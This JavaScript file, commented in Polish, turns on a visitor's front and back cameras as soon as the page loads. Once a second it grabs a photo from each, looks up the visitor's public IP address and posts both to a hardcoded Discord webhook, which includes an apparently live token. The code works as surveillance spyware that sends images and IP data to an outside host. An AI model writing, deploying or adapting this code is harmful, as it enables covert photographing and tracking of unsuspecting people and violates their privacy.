const frontCanvas = document.getElementById('frontCanvas');
const backCanvas = document.getElementById('backCanvas');
const frontCtx = frontCanvas.getContext('2d');
const backCtx = backCanvas.getContext('2d');

let frontStream, backStream;

// Pobieranie dostępu do kamer i robienie zdjęć co sekundę
async function startCameras() {
    try {
        // Pobranie dostępnych urządzeń
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');

        // Wybranie przedniej i tylnej kamery
        const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front'));
        const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back'));

        // Uruchomienie przedniej kamery
        if (frontCamera) {
            frontStream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: frontCamera.deviceId } });
            captureLoop(frontStream, frontCtx, frontCanvas, "Przednia kamera");
        }

        // Uruchomienie tylnej kamery
        if (backCamera) {
            backStream = await navigator.mediaDevices.getUserMedia({ video: { deviceId: backCamera.deviceId } });
            captureLoop(backStream, backCtx, backCanvas, "Tylna kamera");
        }

    } catch (err) {
        console.error("Błąd dostępu do kamer:", err);
    }
}

// Funkcja robienia zdjęć w pętli
async function captureLoop(stream, ctx, canvas, cameraName) {
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    video.onloadedmetadata = () => {
        setInterval(() => captureAndSend(video, ctx, canvas, cameraName), 1000);
    };
}

// Funkcja pobierająca IP i wysyłająca zdjęcie na Discorda
async function captureAndSend(video, ctx, canvas, cameraName) {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
        let formData = new FormData();
        formData.append('file', blob, `${cameraName}.png`);

        try {
            let ipResponse = await fetch('https://api64.ipify.org?format=json');
            let ipData = await ipResponse.json();
            let userIP = ipData.ip;

            formData.append('payload_json', JSON.stringify({
                content: `📸 Nowe zdjęcie (${cameraName})! IP użytkownika: ${userIP}`
            }));

            await fetch("https://discord.com/api/webhooks/1341148754161569956/lHJVIyJeOpz2lpBfU_eRjPKKcvmCSw8vAo6X2bE535wvOnwFxRB9yIYIDchCMAx_zVe4", {
                method: "POST",
                body: formData
            });

            console.log(`Zdjęcie (${cameraName}) i IP wysłane!`);
        } catch (error) {
            console.error(`Błąd wysyłania (${cameraName}):`, error);
        }
    }, 'image/png');
}

// Uruchomienie kamer
startCameras();